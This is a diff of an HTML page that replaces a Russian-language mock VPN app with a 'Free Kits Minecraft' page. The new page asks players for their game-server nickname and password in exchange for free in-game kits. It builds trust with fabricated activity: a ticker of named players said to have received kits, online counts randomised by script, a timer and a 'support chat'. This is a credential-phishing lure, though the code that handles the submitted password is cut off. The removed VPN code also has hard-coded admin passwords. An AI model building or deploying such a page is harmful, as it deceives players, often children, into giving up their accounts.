@@ -3,199 +3,1254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VirtuX VPN</title>
+    <title>Free Kits Minecraft</title>
     <style>
-        :root { --main: #ff0000; --bg: #080808; --card: #121212; --text: #ffffff; --shadow: rgba(255, 0, 0, 0.4); }
-        .blue-theme { --main: #00d9ff; --bg: #000a12; --card: #011627; --shadow: rgba(0, 217, 255, 0.4); }
-        .toxic-theme { --main: #39ff14; --bg: #050a05; --card: #0d1a0d; --shadow: rgba(57, 255, 20, 0.4); }
-        .purple-theme { --main: #bc13fe; --bg: #0a0112; --card: #1a012e; --shadow: rgba(188, 19, 254, 0.4); }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
 
-        * { box-sizing: border-box; transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
-        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .container { background-color: var(--card); padding: 40px; border-radius: 24px; box-shadow: 0 0 50px rgba(0,0,0,0.8), 0 0 20px var(--shadow); width: 440px; text-align: center; border: 2px solid var(--main); position: relative; height: 750px; z-index: 10; }
-        
-        #floating-chat { position: fixed; top: 20px; left: 20px; width: 220px; z-index: 100; display: none; }
-        .chat-toggle { background: var(--card); border: 1px solid var(--main); padding: 10px; border-radius: 12px; cursor: pointer; font-weight: 900; font-size: 11px; display: flex; align-items: center; gap: 8px; box-shadow: 0 0 10px var(--shadow); color: var(--main); text-transform: uppercase; }
-        .chat-window { background: rgba(0,0,0,0.95); border: 1px solid var(--main); border-radius: 12px; margin-top: 10px; height: 280px; display: none; flex-direction: column; overflow: hidden; backdrop-filter: blur(10px); }
-        .chat-msgs { flex-grow: 1; overflow-y: auto; padding: 10px; font-size: 11px; color: #ccc; }
-        .chat-input { background: #000; border: none; border-top: 1px solid #222; color: white; padding: 12px; outline: none; width: 100%; font-size: 11px; }
+        body {
+            background: 
+                linear-gradient(rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9)),
+                url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            transition: background 0.3s;
+        }
 
-        .screen { display: none; height: 100%; flex-direction: column; animation: slideUp 0.4s ease-out; }
-        .active-screen { display: flex; }
-        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        body.snow {
+            background: 
+                linear-gradient(rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9)),
+                url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
+        }
 
-        h1 { font-size: 34px; font-weight: 900; text-transform: uppercase; letter-spacing: 1px; margin: 15px 0; }
-        .accent { color: var(--main); text-shadow: 0 0 10px var(--shadow); }
-        input, select { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #222; background: #0a0a0a; color: white; margin-bottom: 10px; outline: none; font-size: 14px; }
-        input:focus, select:focus { border-color: var(--main); box-shadow: 0 0 10px var(--shadow); }
-        .btn { width: 100%; padding: 18px; border: none; border-radius: 12px; font-weight: 900; cursor: pointer; background: var(--main); color: white; text-transform: uppercase; }
-        .btn:hover { filter: brightness(1.2); transform: translateY(-2px); box-shadow: 0 5px 15px var(--shadow); }
+        body.dark {
+            background: 
+                linear-gradient(rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.9)),
+                url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
+            color: white;
+        }
 
-        .nav-btn { position: absolute; top: 25px; right: 25px; cursor: pointer; font-size: 28px; display: none; }
-        .menu-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); z-index: 900; display: none; flex-direction: column; justify-content: center; align-items: center; }
-        .menu-link { color: white; text-decoration: none; font-size: 18px; margin: 12px; font-weight: bold; cursor: pointer; }
-        .menu-link:hover { color: var(--main); }
+        body.dark .container {
+            background: #1a1a1a;
+            border-color: #333;
+            color: white;
+        }
 
-        .item-list { flex-grow: 1; overflow-y: auto; margin-bottom: 15px; padding: 5px; }
-        .item { background: #161616; padding: 14px; border-radius: 12px; margin-bottom: 10px; cursor: pointer; display: flex; align-items: center; border: 1px solid #222; position: relative; }
-        .active-item { border-color: var(--main); background: rgba(255,0,0,0.05); }
-        .flag { width: 35px; height: 22px; border-radius: 4px; object-fit: cover; margin-right: 15px; background: #333; }
-        
-        #toast { position: fixed; top: 20px; right: 20px; background: var(--main); color: white; padding: 15px 30px; border-radius: 10px; font-weight: bold; display: none; z-index: 2000; }
-        .p-bar-wrap { width: 100%; height: 6px; background: #222; border-radius: 10px; overflow: hidden; margin: 15px 0; display: none; }
-        .p-bar { width: 0%; height: 100%; background: var(--main); box-shadow: 0 0 10px var(--main); }
-        .admin-edit-list { background: #000; border-radius: 10px; padding: 10px; max-height: 120px; overflow-y: auto; font-size: 11px; text-align: left; border: 1px solid #222; }
+        body.dark h1, body.dark h2, body.dark label {
+            color: #2196F3;
+        }
+
+        body.dark input {
+            background: #333;
+            border-color: #444;
+            color: white;
+        }
+
+        .snowflake {
+            position: fixed;
+            top: -10px;
+            color: white;
+            user-select: none;
+            pointer-events: none;
+            z-index: 9999;
+            font-size: 1em;
+            animation: fall linear forwards;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+
+        .menu-button {
+            position: fixed;
+            top: 90px;
+            right: 20px;
+            width: 45px;
+            height: 45px;
+            background: #2196F3;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            z-index: 1001;
+            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.4);
+            transition: all 0.3s;
+        }
+
+        .menu-button:hover {
+            transform: scale(1.1);
+        }
+
+        .menu-button span {
+            width: 25px;
+            height: 3px;
+            background: white;
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+
+        .menu-button.active span:nth-child(1) {
+            transform: rotate(45deg) translate(8px, 8px);
+        }
+
+        .menu-button.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .menu-button.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
+        }
+
+        .menu-panel {
+            position: fixed;
+            top: 140px;
+            right: 20px;
+            width: 250px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+            overflow: hidden;
+            border: 1px solid #2196F3;
+        }
+
+        body.dark .menu-panel {
+            background: #1a1a1a;
+            border-color: #333;
+        }
+
+        .menu-panel.show {
+            display: block;
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .menu-item {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        body.dark .menu-item {
+            border-color: #333;
+            color: white;
+        }
+
+        .menu-item:hover {
+            background: #e3f2fd;
+        }
+
+        body.dark .menu-item:hover {
+            background: #333;
+        }
+
+        .menu-item:last-child {
+            border-bottom: none;
+        }
+
+        .settings-group {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        body.dark .settings-group {
+            border-color: #333;
+        }
+
+        .settings-group h3 {
+            margin-bottom: 10px;
+            color: #2196F3;
+            font-size: 14px;
+        }
+
+        .setting-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .setting-option input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .color-options {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .color-btn {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .color-btn:hover {
+            transform: scale(1.2);
+        }
+
+        .color-btn.selected {
+            border-color: #2196F3;
+        }
+
+        .color-btn.white {
+            background: white;
+            border: 2px solid #ddd;
+        }
+
+        .color-btn.dark {
+            background: #1a1a1a;
+            border: 2px solid #333;
+        }
+
+        .color-btn.blue {
+            background: #2196F3;
+        }
+
+        body::before {
+            content: "Free Kits Minecraft Server";
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 3vw;
+            color: rgba(33, 150, 243, 0.08);
+            white-space: nowrap;
+            pointer-events: none;
+            z-index: 0;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 5px;
+        }
+
+        .stats-bar {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            background: #2196F3;
+            color: white;
+            padding: 10px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 14px;
+            z-index: 100;
+            box-shadow: 0 2px 10px rgba(33, 150, 243, 0.3);
+        }
+
+        .stats-left {
+            display: flex;
+            gap: 30px;
+        }
+
+        .stats-left span {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .online-dot {
+            width: 10px;
+            height: 10px;
+            background: #fff;
+            border-radius: 50%;
+            display: inline-block;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .kits-count {
+            background: #1976D2;
+            padding: 4px 15px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+
+        .ticker {
+            position: fixed;
+            top: 48px;
+            left: 0;
+            right: 0;
+            background: #e3f2fd;
+            color: #1565C0;
+            padding: 10px 0;
+            overflow: hidden;
+            border-bottom: 1px solid #bbdefb;
+            z-index: 99;
+            font-size: 14px;
+            white-space: nowrap;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
+        }
+
+        body.dark .ticker {
+            background: #1a1a1a;
+            color: #2196F3;
+            border-color: #333;
+        }
+
+        .ticker-content {
+            display: inline-block;
+            animation: ticker 180s linear infinite;
+            padding-left: 100%;
+        }
+
+        .ticker-content span {
+            display: inline-block;
+            margin-right: 50px;
+            color: #0d47a1;
+        }
+
+        body.dark .ticker-content span {
+            color: #2196F3;
+        }
+
+        .ticker-content span i {
+            color: #42a5f5;
+            margin: 0 5px;
+            font-style: italic;
+        }
+
+        .ticker-content .kit-badge {
+            background: #2196F3;
+            color: white;
+            padding: 3px 10px;
+            border-radius: 20px;
+            margin: 0 8px;
+            font-size: 11px;
+            font-weight: 600;
+        }
+
+        @keyframes ticker {
+            0% { transform: translateX(0); }
+            100% { transform: translateX(-100%); }
+        }
+
+        .ticker:hover .ticker-content {
+            animation-play-state: paused;
+        }
+
+        .container {
+            background: white;
+            border-radius: 16px;
+            box-shadow: 0 10px 40px rgba(33, 150, 243, 0.2);
+            width: 100%;
+            max-width: 500px;
+            padding: 35px;
+            position: relative;
+            z-index: 2;
+            margin-top: 100px;
+            border: 1px solid #bbdefb;
+            transition: all 0.3s;
+        }
+
+        h1 {
+            font-size: 26px;
+            color: #1565C0;
+            margin-bottom: 25px;
+            text-align: center;
+            font-weight: 700;
+            border-bottom: 2px solid #e3f2fd;
+            padding-bottom: 15px;
+        }
+
+        h2 {
+            font-size: 18px;
+            color: #1976D2;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .step {
+            display: none;
+        }
+
+        .step.active {
+            display: block;
+        }
+
+        .server-select {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 10px;
+        }
+
+        .server-btn, .kit-btn {
+            flex: 1;
+            padding: 15px;
+            border: 2px solid #bbdefb;
+            background: white;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #1976D2;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        body.dark .server-btn, body.dark .kit-btn {
+            background: #333;
+            border-color: #444;
+            color: #2196F3;
+        }
+
+        .server-btn:hover, .kit-btn:hover {
+            border-color: #2196F3;
+            background: #e3f2fd;
+        }
+
+        body.dark .server-btn:hover, body.dark .kit-btn:hover {
+            background: #444;
+        }
+
+        .server-btn.selected, .kit-btn.selected {
+            background: #2196F3;
+            color: white;
+            border-color: #1976D2;
+        }
+
+        .kits-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 25px 0;
+        }
+
+        .kit-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 5px;
+            padding: 15px 5px;
+        }
+
+        .kit-emoji {
+            font-size: 24px;
+        }
+
+        .kit-rarity {
+            font-size: 11px;
+            opacity: 0.8;
+        }
+
+        .info-box {
+            background: #e3f2fd;
+            border-left: 4px solid #2196F3;
+            padding: 15px 20px;
+            border-radius: 10px;
+            margin-bottom: 25px;
+            font-size: 14px;
+            color: #0d47a1;
+        }
+
+        body.dark .info-box {
+            background: #333;
+            color: #2196F3;
+        }
+
+        .info-box strong {
+            color: #1565C0;
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        body.dark .info-box strong {
+            color: #2196F3;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #1976D2;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 2px solid #bbdefb;
+            border-radius: 10px;
+            font-size: 15px;
+            transition: all 0.2s;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #2196F3;
+            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.1);
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 16px;
+            background: #2196F3;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.2s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .submit-btn:hover {
+            background: #1976D2;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(33, 150, 243, 0.4);
+        }
+
+        .message {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .message.show {
+            display: block;
+        }
+
+        .message.success {
+            background: #e8f5e9;
+            color: #2e7d32;
+            border: 1px solid #a5d6a7;
+        }
+
+        .message.error {
+            background: #ffebee;
+            color: #c62828;
+            border: 1px solid #ef9a9a;
+        }
+
+        .timer {
+            margin-top: 20px;
+            padding: 15px;
+            background: #e3f2fd;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        body.dark .timer {
+            background: #333;
+        }
+
+        .timer-display {
+            font-size: 36px;
+            font-weight: 700;
+            color: #1565C0;
+            font-family: monospace;
+            letter-spacing: 3px;
+        }
+
+        body.dark .timer-display {
+            color: #2196F3;
+        }
+
+        .timer-text {
+            font-size: 14px;
+            color: #1976D2;
+            margin-top: 5px;
+        }
+
+        body.dark .timer-text {
+            color: #2196F3;
+        }
+
+        .back-btn {
+            background: none;
+            border: none;
+            color: #1976D2;
+            cursor: pointer;
+            font-size: 14px;
+            padding: 8px 0;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            font-weight: 600;
+        }
+
+        .back-btn:hover {
+            color: #0d47a1;
+        }
+
+        .back-btn::before {
+            content: "←";
+            font-size: 18px;
+        }
+
+        .support-chat {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            width: 300px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 5px 30px rgba(0,0,0,0.2);
+            z-index: 1000;
+            overflow: hidden;
+            border: 1px solid #2196F3;
+        }
+
+        body.dark .support-chat {
+            background: #1a1a1a;
+            border-color: #333;
+        }
+
+        .chat-header {
+            background: #2196F3;
+            color: white;
+            padding: 12px 15px;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-weight: 600;
+        }
+
+        .chat-status {
+            font-size: 12px;
+            background: #4caf50;
+            padding: 3px 8px;
+            border-radius: 12px;
+        }
+
+        .chat-body {
+            max-height: 350px;
+            transition: max-height 0.3s;
+            overflow: hidden;
+        }
+
+        .chat-body.minimized {
+            max-height: 0;
+        }
+
+        .chat-messages {
+            height: 250px;
+            overflow-y: auto;
+            padding: 10px;
+            background: #f5f5f5;
+            display: flex;
+            flex-direction: column;
+        }
+
+        body.dark .chat-messages {
+            background: #222;
+        }
+
+        .message {
+            margin-bottom: 10px;
+            padding: 8px 12px;
+            border-radius: 8px;
+            max-width: 80%;
+            font-size: 13px;
+        }
+
+        .message.user {
+            background: #2196F3;
+            color: white;
+            align-self: flex-end;
+        }
+
+        .message.support {
+            background: white;
+            color: #333;
+            align-self: flex-start;
+            border: 1px solid #ddd;
+        }
+
+        body.dark .message.support {
+            background: #333;
+            color: white;
+            border-color: #444;
+        }
+
+        .message-time {
+            font-size: 10px;
+            opacity: 0.7;
+            margin-top: 3px;
+            text-align: right;
+        }
+
+        .waiting-message {
+            color: #999;
+            font-style: italic;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 5px;
+            padding: 5px;
+        }
+
+        .chat-input-area {
+            display: flex;
+            padding: 10px;
+            background: white;
+            border-top: 1px solid #ddd;
+        }
+
+        body.dark .chat-input-area {
+            background: #1a1a1a;
+            border-color: #333;
+        }
+
+        .chat-input-area input {
+            flex: 1;
+            padding: 8px 12px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            margin-right: 8px;
+        }
+
+        body.dark .chat-input-area input {
+            background: #333;
+            border-color: #444;
+            color: white;
+        }
+
+        .chat-input-area input:focus {
+            outline: none;
+            border-color: #2196F3;
+        }
+
+        .chat-input-area button {
+            padding: 8px 15px;
+            background: #2196F3;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .chat-input-area button:hover {
+            background: #1976D2;
+        }
+
+        .unread-badge {
+            background: #f44336;
+            color: white;
+            font-size: 11px;
+            padding: 2px 6px;
+            border-radius: 10px;
+            margin-left: 8px;
+        }
     </style>
 </head>
 <body>
+    <audio id="successSound" preload="auto">
+        <source src="https://www.myinstants.com/media/sounds/minecraft-level-up.mp3" type="audio/mpeg">
+    </audio>
 
-<div id="toast"></div>
-
-<div id="floating-chat">
-    <div class="chat-toggle" onclick="toggleChat()">💬 ЧАТ ПОЛЬЗОВАТЕЛЕЙ</div>
-    <div class="chat-window" id="chat-win">
-        <div class="chat-msgs" id="chat-list"></div>
-        <input type="text" class="chat-input" id="chat-in" placeholder="Введите сообщение..." onkeypress="if(event.key==='Enter') sendChat()">
-    </div>
-</div>
-
-<div class="container">
-    <div class="nav-btn" id="burger" onclick="toggleMenu()">☰</div>
-
-    <div id="menu" class="menu-overlay">
-        <div class="menu-link" onclick="nextTheme()">🌓 СМЕНИТЬ ТЕМУ</div>
-        <div class="menu-link" onclick="nav('scr-pay'); toggleMenu()">💳 ПЛАН ОБНОВЛЕНИЯ</div>
-        <div class="menu-link" onclick="nav('scr-adm-auth'); toggleMenu()">⚙ ПАНЕЛЬ АДМИНИСТРАТОРА</div>
-        <div class="menu-link" onclick="location.reload()" style="color:#444">ВЫХОД</div>
-        <div class="menu-link" onclick="toggleMenu()" style="margin-top:20px; font-size:14px; opacity:0.5;">ЗАКРЫТЬ</div>
+    <div class="stats-bar">
+        <div class="stats-left">
+            <span>
+                <span class="online-dot"></span>
+                <span id="onlineCount">2,847</span> игроков онлайн
+            </span>
+            <span>
+                <span>🎁</span>
+                <span id="kitsAvailable">1,500</span> свободных китов
+            </span>
+        </div>
+        <div class="kits-count">
+            Выдано сегодня: 1,247
+        </div>
     </div>
 
-    <div id="scr-reg" class="screen active-screen">
-        <h1><span class="accent">virtux</span> vpn</h1>
-        <input type="text" id="reg-user" placeholder="Логин (от 3 до 35)">
-        <input type="password" id="reg-pass" placeholder="Пароль (от 3 до 35)">
-        <button class="btn" onclick="register()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
-        <p style="margin-top:20px; font-size:13px; cursor:pointer;" onclick="nav('scr-login')">Уже есть аккаунт? <span class="accent">Войти</span></p>
+    <div class="ticker">
+        <div class="ticker-content" id="tickerContent"></div>
     </div>
 
-    <div id="scr-login" class="screen">
-        <h1><span class="accent">virtux</span> login</h1>
-        <input type="text" id="login-user" placeholder="Логин">
-        <input type="password" id="login-pass" placeholder="Пароль">
-        <button class="btn" onclick="login()">ВОЙТИ</button>
+    <div class="menu-button" id="menuButton" onclick="toggleMenu()">
+        <span></span>
+        <span></span>
+        <span></span>
     </div>
 
-    <div id="scr-adm-auth" class="screen">
-        <h1>ADMIN <span class="accent">AUTH</span></h1>
-        <input type="text" id="adm-user" placeholder="Ник">
-        <input type="password" id="adm-pass" placeholder="Пароль">
-        <button class="btn" onclick="authAdmin()">ПОДТВЕРДИТЬ</button>
-        <button class="btn" style="background:none; margin-top:10px;" onclick="nav('scr-vpn')">ОТМЕНА</button>
+    <div class="menu-panel" id="menuPanel">
+        <div class="settings-group">
+            <h3>Настройки</h3>
+            <div class="setting-option">
+                <span>❄️ Включить снег</span>
+                <input type="checkbox" id="snowToggle" onchange="toggleSnow()">
+            </div>
+            <div class="setting-option">
+                <span>🎨 Цвет фона</span>
+            </div>
+            <div class="color-options">
+                <div class="color-btn white selected" onclick="setColor('white')" title="Светлый"></div>
+                <div class="color-btn dark" onclick="setColor('dark')" title="Темный"></div>
+                <div class="color-btn blue" onclick="setColor('blue')" title="Синий"></div>
+            </div>
+        </div>
+        <div class="menu-item" onclick="window.open('https://t.me/HelpimServer', '_blank')">
+            <span>📢</span> Мы в Telegram
+        </div>
+        <div class="menu-item" onclick="window.open('https://t.me/FullMicBot', '_blank')">
+            <span>🤖</span> Наш бот
+        </div>
+        <div class="menu-item" onclick="showAbout()">
+            <span>ℹ️</span> О нас
+        </div>
     </div>
 
-    <div id="scr-dev" class="screen">
-        <h1>DEVI<span class="accent">CE</span></h1>
-        <div class="item-list" id="dev-list"></div>
-        <button class="btn" onclick="nav('scr-vpn')">ДАЛЕЕ</button>
+    <div class="container">
+        <h1>⚡ FREE KITS ⚡</h1>
+
+        <div id="step1" class="step active">
+            <h2>Выберите сервер:</h2>
+            <div class="server-select">
+                <button class="server-btn" onclick="selectServer('frizmine')">FrizMine</button>
+                <button class="server-btn" onclick="selectServer('phoenix')">Phoenix PE</button>
+            </div>
+        </div>
+
+        <div id="step2" class="step">
+            <button class="back-btn" onclick="goToStep1()">Назад</button>
+            <div class="info-box" id="selectedServerInfo">
+                <strong>Выбран сервер:</strong> <span id="serverNameDisplay"></span>
+            </div>
+            <h2>Доступные киты:</h2>
+            <div class="kits-grid" id="kitsContainer"></div>
+        </div>
+
+        <div id="step3" class="step">
+            <button class="back-btn" onclick="goToStep2()">Назад</button>
+            <div class="info-box">
+                <strong>Ваш выбор:</strong>
+                <span id="finalChoiceDisplay"></span>
+            </div>
+            
+            <form id="loginForm">
+                <div class="form-group">
+                    <label>Никнейм:</label>
+                    <input type="text" id="username" required placeholder="Введите ник">
+                </div>
+                
+                <div class="form-group">
+                    <label>Пароль:</label>
+                    <input type="password" id="password" required placeholder="Введите пароль">
+                </div>
+                
+                <button type="submit" class="submit-btn">Получить кит</button>
+            </form>
+            
+            <div id="message" class="message"></div>
+            <div id="timer" class="timer" style="display: none;">
+                <div class="timer-display" id="timerDisplay">05:00</div>
+                <div class="timer-text">до получения кита</div>
+            </div>
+        </div>
     </div>
 
-    <div id="scr-vpn" class="screen">
-        <h1>VIRTUX <span class="accent">VPN</span></h1>
-        <div class="item-list" id="srv-list"></div>
-        <div class="p-bar-wrap" id="ldr"><div class="p-bar" id="p-bar"></div></div>
-        <div id="ok" style="display:none; font-size:50px; color:#00ff00; margin:10px;">✔</div>
-        <button class="btn" id="c-btn" onclick="connect()">ПОДКЛЮЧИТЬСЯ</button>
+    <div class="support-chat" id="supportChat">
+        <div class="chat-header" onclick="toggleChat()">
+            <span>💬 Чат с поддержкой <span class="unread-badge" id="unreadBadge" style="display: none;">1</span></span>
+            <span class="chat-status">Онлайн</span>
+        </div>
+        <div class="chat-body" id="chatBody">
+            <div class="chat-messages" id="chatMessages"></div>
+            <div class="chat-input-area">
+                <input type="text" id="chatInput" placeholder="Напишите сообщение..." onkeypress="if(event.key==='Enter') sendSupportMessage()">
+                <button onclick="sendSupportMessage()">➤</button>
+            </div>
+        </div>
     </div>
 
-    <div id="scr-adm" class="screen">
-        <h1 style="font-size:24px;">ADMIN <span class="accent">CONTROL</span></h1>
-        <select id="adm-type">
-            <option value="srv">СЕРВЕР (SERVER)</option>
-            <option value="dev">УСТРОЙСТВО (DEVICE)</option>
-        </select>
-        <input type="text" id="adm-n" placeholder="Название (Name)">
-        <input type="text" id="adm-p" placeholder="Ссылка на фото (URL)">
-        <button class="btn" style="height:45px; font-size:12px;" onclick="addItem()">ДОБАВИТЬ ЭЛЕМЕНТ</button>
-        <div class="admin-edit-list" id="adm-items"></div>
-        <button class="btn" style="background:none; margin-top:10px;" onclick="nav('scr-vpn')">НАЗАД</button>
-    </div>
+    <script>
+        const recentKits = [
+            { name: 'felldart8875124', kit: 'Кит Магистра', emoji: '👑' },
+            { name: 'ultrawanvel', kit: 'Кит Принца', emoji: '⚔️' },
+            { name: 'yar1kzxc0706', kit: 'Кит Легенды', emoji: '🌟' },
+            { name: 'trueangelpet', kit: 'Кит Князя', emoji: '💎' },
+            { name: 'witherez', kit: 'Кит Ютуб', emoji: '📺' },
+            { name: 'shaker8918', kit: 'Кит Магистра', emoji: '👑' },
+            { name: 'anarchytop1pve', kit: 'Кит Принца', emoji: '⚔️' },
+            { name: 'mooff56', kit: 'Кит Легенды', emoji: '🌟' }
+        ];
 
-    <div id="scr-pay" class="screen">
-        <h1>PAY<span class="accent">MENT</span></h1>
-        <div class="item" onclick="toast('Генерация СБП...')">💳 СБП / КАРТЫ</div>
-        <div class="item" onclick="toast('Кошелек скопирован!')">₿ CRYPTO</div>
-        <button class="btn" style="background:none; border:1px solid #333; margin-top:20px;" onclick="nav('scr-vpn')">НАЗАД</button>
-    </div>
-</div>
+        let selectedServer = '';
+        let selectedKit = '';
+        let timerInterval;
+        let snowInterval;
+        let lastMessageId = 0;
 
-<script>
-    let user = null; let lastMsg = 0; let currentTheme = 0;
-    const themes = ['', 'blue-theme', 'toxic-theme', 'purple-theme'];
-    let servers = JSON.parse(localStorage.getItem('vx_srv_v5')) || [{name:'GERMANY', photo:'https://flagcdn.com', id:1}];
-    let devices = JSON.parse(localStorage.getItem('vx_dev_v5')) || [{name:'WINDOWS', photo:'https://cdn-icons-png.flaticon.com', id:10}];
+        const kits = {
+            'frizmine': [
+                { name: 'Кит Магистра', id: 'master', emoji: '👑', rarity: 'Легендарный' },
+                { name: 'Кит Принца', id: 'prince', emoji: '⚔️', rarity: 'Редкий' },
+                { name: 'Кит Легенды', id: 'legend', emoji: '🌟', rarity: 'Эпический' }
+            ],
+            'phoenix': [
+                { name: 'Кит Князя', id: 'knyaz', emoji: '💎', rarity: 'Легендарный' },
+                { name: 'Кит Принца', id: 'prince', emoji: '⚔️', rarity: 'Редкий' },
+                { name: 'Кит Ютуб', id: 'youtube', emoji: '📺', rarity: 'Эпический' }
+            ]
+        };
 
-    window.onload = () => { renderAll(); setInterval(updatePings, 2000); };
+        const serverNames = {
+            'frizmine': 'FrizMine',
+            'phoenix': 'Phoenix PE'
+        };
 
-    function nav(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active-screen')); document.getElementById(id).classList.add('active-screen'); }
-    function toast(txt) { const t = document.getElementById('toast'); t.innerText = txt; t.style.display = 'block'; setTimeout(() => t.style.display = 'none', 3000); }
-    
-    function register() {
-        const u = document.getElementById('reg-user').value.trim(); const p = document.getElementById('reg-pass').value.trim();
-        if(u.length < 3 || u.length > 35) return toast("3-35 символов!");
-        localStorage.setItem('vx_user_' + u, p); toast("Готово!"); nav('scr-login');
-    }
+        function playSuccessSound() {
+            const sound = document.getElementById('successSound');
+            sound.volume = 0.3;
+            sound.play().catch(e => console.log(''));
+        }
 
-    function login() {
-        const u = document.getElementById('login-user').value.trim(); const p = document.getElementById('login-pass').value.trim();
-        if(localStorage.getItem('vx_user_' + u) === p || (u === 'loqin' && p === 'house2233')) {
-            user = u; document.getElementById('burger').style.display = 'block'; document.getElementById('floating-chat').style.display = 'block'; nav('scr-dev');
-        } else toast("Ошибка входа!");
-    }
+        function initTicker() {
+            const ticker = document.getElementById('tickerContent');
+            let html = '';
+            recentKits.forEach(item => {
+                html += `<span>${item.name} <i>получил(а)</i> ${item.emoji} ${item.kit}</span>`;
+            });
+            html += html;
+            ticker.innerHTML = html;
+        }
 
-    function authAdmin() { if(document.getElementById('adm-user').value === 'admin' && document.getElementById('adm-pass').value === 'house2233') nav('scr-adm'); else toast("Отказ!"); }
+        function updateOnline() {
+            const online = document.getElementById('onlineCount');
+            const kitsAvailable = document.getElementById('kitsAvailable');
+            setInterval(() => {
+                online.textContent = (2847 + Math.floor(Math.random() * 100) - 50).toLocaleString();
+                kitsAvailable.textContent = (1500 + Math.floor(Math.random() * 200) - 100).toLocaleString();
+            }, 30000);
+        }
 
-    function renderAll() {
-        const sList = document.getElementById('srv-list'); const dList = document.getElementById('dev-list'); const aList = document.getElementById('adm-items');
-        sList.innerHTML = ''; dList.innerHTML = ''; aList.innerHTML = '';
